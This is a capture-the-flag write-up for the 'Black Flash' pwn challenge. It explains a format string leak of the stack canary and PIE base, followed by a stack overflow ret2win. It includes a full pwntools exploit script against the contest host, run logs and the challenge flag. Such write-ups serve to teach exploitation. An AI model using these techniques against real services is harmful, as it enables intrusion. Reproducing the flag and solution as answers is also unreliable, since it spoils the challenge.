---
title: "Black Flash"
summary: "UMCS Preliminary umcs preliminary, reverse engineering, binary exploitation writeup covering Black Flash with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - reverse-engineering
  - binary-exploitation
  - boot2root
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** Black Flash
**Category:** Pwn / Binary Exploitation
**Points:** 270
**Flag Format:** `UMCS{...}`
**Remote Target:** `nc chal.umcybersec.site 10069`
**Provided Files:**

```txt
black_flash
ld-linux-x86-64.so.2
libc.so.6
```

The challenge provides a 64-bit Linux ELF binary and its matching dynamic linker/libc. The goal is to exploit the remote service, redirect execution to the hidden `win()` function, and read the flag.

The final successful remote run confirmed that the service printed:

```txt
U got the feeling! Black Flash!!!!?
Flag: UMCS{wh7_bl4ck_fl45h_15_120_p3rc3nt?}
```

This was recovered from the exploit output against `chal.umcybersec.site:10069`.

---

# Initial Analysis

We begin by checking the binary type:

```bash
file black_flash
```

Output:

```txt
black_flash: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Important observations:

```txt
Architecture : amd64 / x86-64
PIE          : Enabled
Canary       : Enabled
NX           : Enabled
Stripped     : No
```

Because the binary is **not stripped**, useful symbols such as `main`, `vuln`, and `win` are visible.

Using `readelf`:

```bash
readelf -s black_flash | grep -E ' win$| main$| vuln$'
```

Relevant symbols:

```txt
win   = 0x1261
vuln  = 0x132c
main  = 0x1513
```

The binary also contains useful strings:

```bash
strings -tx black_flash
```

Relevant strings include:

```txt
200a flag.txt
2013 [!] Could not open flag.txt
2030 U got the feeling! Black Flash!!!!?
2054 Flag: %s
205e Where is the feeling......:
2080 Is this the feeling you want......:
20a9 Now, you reach the core of the spark......:
20d6 Is there any spark here:
```

This strongly indicates that `win()` opens `flag.txt`, reads it, and prints it.

---

# Vulnerability / Weakness Identification

The vulnerable function is `vuln()`.

Disassembly shows the stack buffer is located at:

```asm
lea -0x80(%rbp), %rax
```

The first input uses:

```asm
mov $0x70, %esi
call fgets
```

Then the program passes the user-controlled buffer directly into `printf`:

```asm
lea -0x80(%rbp), %rax
mov %rax, %rdi
call printf
```

Conceptually, the bug is:

```c
char buf[0x80];

fgets(buf, 0x70, stdin);
printf(buf);              // format string vulnerability

fgets(buf, 0x100, stdin); // stack buffer overflow
```

There are two vulnerabilities:

## 1. Format String Vulnerability

The program does:

```c
printf(buf);
```

instead of:

```c
printf("%s", buf);
```

This allows us to leak stack values using payloads like:

```txt
%21$p.%31$p.%37$p
```

From the successful run, the leak returned:

```txt
0x84eb2cd2329c7800.0x5b92b448f513.0x7118edf36000
```

The values were interpreted as:

```txt
Canary   = 0x84eb2cd2329c7800
PIE leak = 0x5b92b448f513
```

The trace confirms the format string payload, leaked canary, PIE leak, and calculated PIE base.

## 2. Stack Buffer Overflow

The second input reads `0x100` bytes into the same stack buffer at `rbp-0x80`.

The canary is stored at `rbp-0x8`.

Therefore, the distance from the start of the buffer to the canary is:

```txt
0x80 - 0x8 = 0x78
```

Payload layout:

```txt
"A" * 0x78
+ leaked canary
+ fake saved RBP
+ ret gadget
+ win address
```

The binary has stack canary protection, so overwriting the return address directly would normally crash with `__stack_chk_fail`. The format string leak lets us preserve the correct canary value and bypass that protection.

---

# Exploitation Strategy

The exploit uses a two-stage attack.

## Stage 1: Leak Canary and PIE Base

Send this format string:

```txt
%21$p.%31$p.%37$p
```

The important leaks are:

```txt
%21$p = stack canary
%31$p = PIE leak, usually main + 0x1513
%37$p = backup leak depending on runtime layout
```

In the working remote run:

```txt
%21$p = 0x84eb2cd2329c7800
%31$p = 0x5b92b448f513
```

Since `main()` is at offset `0x1513`, calculate PIE base:

```txt
PIE base = leak31 - main offset
PIE base = 0x5b92b448f513 - 0x1513
PIE base = 0x5b92b448e000
```

## Stage 2: Calculate Runtime Addresses

Known offsets:

```txt
ret gadget = 0x1016
win()      = 0x1261
```

Runtime addresses:

```txt
ret = PIE base + 0x1016
win = PIE base + 0x1261
```

Using the observed PIE base:

```txt
ret = 0x5b92b448e000 + 0x1016 = 0x5b92b448f016
win = 0x5b92b448e000 + 0x1261 = 0x5b92b448f261
```

The successful trace confirms these exact values were used in the final payload.

## Stage 3: Overflow and Ret2Win

The final payload structure is:

```txt
offset 0x00: padding, 0x78 bytes
offset 0x78: leaked canary
offset 0x80: fake saved RBP
offset 0x88: ret gadget
offset 0x90: win()
```

The extra `ret` gadget is used for stack alignment. On amd64 Linux, some libc functions expect the stack to be 16-byte aligned. Without the alignment `ret`, the program may crash inside functions called by `win()`.

---

# Proof of Concept

A minimal conceptual payload looks like this:

```python
payload  = b"A" * 0x78
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret_gadget)
payload += p64(win_addr)
```

The attack flow:

```txt
1. Connect to chal.umcybersec.site:10069.
2. Wait for the first prompt.
3. Send %21$p.%31$p.%37$p.
4. Parse leaked stack values.
5. Extract the canary.
6. Calculate PIE base from the leaked main address.
7. Build ret2win payload.
8. Send overflow payload.
9. Receive flag.
```

Example remote interaction from the successful run:

```txt
[+] Canary   : 0x84eb2cd2329c7800
[*] PIE leak via %31$p
[+] PIE Base : 0x5b92b448e000
[*] Payload sent. Reading response...
U got the feeling! Black Flash!!!!?
Flag: UMCS{wh7_bl4ck_fl45h_15_120_p3rc3nt?}
```

The final remote output confirms successful control-flow hijacking into `win()`.

---

# Full Python Solver

Save the following script as:

```bash
solve_pwn.py
```

```python
#!/usr/bin/env python3
from pwn import *
import re

# ============================================================
# Black Flash - UMCS Prelim
# Exploit: Format String Leak -> Canary Bypass -> Ret2Win
# ============================================================

HOST = "chal.umcybersec.site"
PORT = 10069

# Offsets found from local binary analysis
PAD = 0x78
RET_OFFSET = 0x1016
WIN_OFFSET = 0x1261
MAIN_OFFSET = 0x1513
FINI_ARRAY_PTR = 0x3dd8

context.arch = "amd64"
context.log_level = "info"
# Use this for troubleshooting:
# context.log_level = "debug"


def main():
    # Connect to the remote challenge service
    p = remote(HOST, PORT)

    # ------------------------------------------------------------
    # Stage 1: Leak stack canary and PIE pointer
    # ------------------------------------------------------------
    #
    # %21$p leaks the stack canary.
    # %31$p usually leaks a pointer into the PIE binary.
    # %37$p is kept as a fallback because stack positions can differ
    # slightly depending on how the binary is launched.
    #
    fmt_payload = b"%21$p.%31$p.%37$p"

    p.sendlineafter(b"Where is the feeling", fmt_payload)

    # The service prints the leak and then asks for the second input.
    # Using clean() avoids brittle recvuntil() synchronization issues.
    sleep(0.5)
    leak_data = p.clean(timeout=2).decode(errors="ignore")

    log.info("Raw leak output:")
    print(leak_data)

    leaks = re.findall(r"0x[0-9a-fA-F]+", leak_data)

    if len(leaks) < 3:
        log.failure("Failed to parse enough leaked pointers.")
        p.close()
        return

    canary = int(leaks[0], 16)
    leak31 = int(leaks[1], 16)
    leak37 = int(leaks[2], 16)

    log.success(f"Canary : {hex(canary)}")
    log.info(f"Leak31 : {hex(leak31)}")
    log.info(f"Leak37 : {hex(leak37)}")

    # ------------------------------------------------------------
    # Stage 2: Calculate PIE base
    # ------------------------------------------------------------
    #
    # If leak31 ends with 0x513, it matches main() at offset 0x1513.
    # Therefore:
    #
    # PIE base = leak31 - 0x1513
    #
    # The fallback handles another possible leak at offset 0x3dd8.
    #
    if leak31 & 0xFFF == 0x513:
        pie_base = leak31 - MAIN_OFFSET
        log.info("Using %31$p as PIE leak: main()")
    elif leak37 & 0xFFF == 0xDD8:
        pie_base = leak37 - FINI_ARRAY_PTR
        log.info("Using %37$p as PIE leak: fini_array")
    else:
        log.failure("Could not identify a valid PIE leak.")
        log.failure(f"leak31 = {hex(leak31)}")
        log.failure(f"leak37 = {hex(leak37)}")
        p.close()
        return

    ret_gadget = pie_base + RET_OFFSET
    win_addr = pie_base + WIN_OFFSET

    log.success(f"PIE base   : {hex(pie_base)}")
    log.success(f"ret gadget : {hex(ret_gadget)}")
    log.success(f"win()      : {hex(win_addr)}")

    # ------------------------------------------------------------
    # Stage 3: Build overflow payload
    # ------------------------------------------------------------
    #
    # Stack layout:
    #
    # buffer       -> 0x78 bytes until canary
    # canary       -> must be preserved
    # saved RBP    -> dummy value
    # saved RIP    -> ret gadget
    # next address -> win()
    #
    payload = b"A" * PAD
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret_gadget)
    payload += p64(win_addr)

    # Send the final overflow payload
    p.sendline(payload)

    # ------------------------------------------------------------
    # Stage 4: Receive flag
    # ------------------------------------------------------------
    log.info("Payload sent. Waiting for flag...")
    output = p.recvall(timeout=3).decode(errors="ignore")

    print(output)

    p.close()


if __name__ == "__main__":
    main()
```

---

# Walkthrough

## 1. Install dependencies

The exploit uses `pwntools`.

On Kali:

```bash
python3 -m pip install --break-system-packages pwntools
```

Or, if your environment already has pwntools:

```bash
python3 -c "from pwn import *; print('pwntools OK')"
```

## 2. Save the exploit

```bash
nano solve_pwn.py
```

Paste the full script, then save.

## 3. Run the exploit

```bash
python3 solve_pwn.py
```

Expected output should look similar to:

```txt
[+] Opening connection to chal.umcybersec.site on port 10069: Done
[*] Raw leak output:
Is this the feeling you want......: 0x84eb2cd2329c7800.0x5b92b448f513.0x7118edf36000

Now, you reach the core of the spark......:

[+] Canary : 0x84eb2cd2329c7800
[*] Using %31$p as PIE leak: main()
[+] PIE base   : 0x5b92b448e000
[+] ret gadget : 0x5b92b448f016
[+] win()      : 0x5b92b448f261
[*] Payload sent. Waiting for flag...
Is there any spark here: U got the feeling! Black Flash!!!!?
Flag: UMCS{wh7_bl4ck_fl45h_15_120_p3rc3nt?}
```

## 4. Troubleshooting

If the script hangs, enable debug mode:

```python
context.log_level = "debug"
```

The remote service prints large ASCII art and has slightly awkward prompt ordering. Earlier strict prompt matching caused a hang because the script waited for:

```txt
Is there any spark here:
```

before sending the second payload, but that text appears after the second input is processed. The reliable fix is to use:

```python
p.clean(timeout=2)
```

after sending the format string. This captures all available output, including the leaks, without relying on exact prompt synchronization.

If the script fails to identify the PIE leak, rerun it. Stack values can shift slightly between local and remote execution. The solver checks both `%31$p` and `%37$p`.

---

# Flag

The flag is printed by the `win()` function after successful exploitation:

```txt
UMCS{wh7_bl4ck_fl45h_15_120_p3rc3nt?}
```

Recovered output:

```txt
U got the feeling! Black Flash!!!!?
Flag: UMCS{wh7_bl4ck_fl45h_15_120_p3rc3nt?}
```

This exact flag output was confirmed in the successful remote execution log.

---

# Conclusion

The root cause of the challenge is unsafe handling of user input in two places:

```c
printf(buf);
fgets(buf, 0x100, stdin);
```

The first bug provides an information disclosure primitive through a format string vulnerability. This leaks the stack canary and a PIE address. The second bug provides a stack-based buffer overflow, allowing control over the saved return address.

Because the stack canary and PIE base are leaked first, modern protections can be bypassed:

```txt
Canary bypass  -> preserve leaked canary
PIE bypass     -> calculate runtime win() address
NX bypass      -> ret2win, no shellcode needed
```

The key lesson is that mitigations are only effective when no information disclosure exists. A single format string bug can expose the values required to defeat both stack canaries and PIE, turning a protected binary into a reliable ret2win exploit.
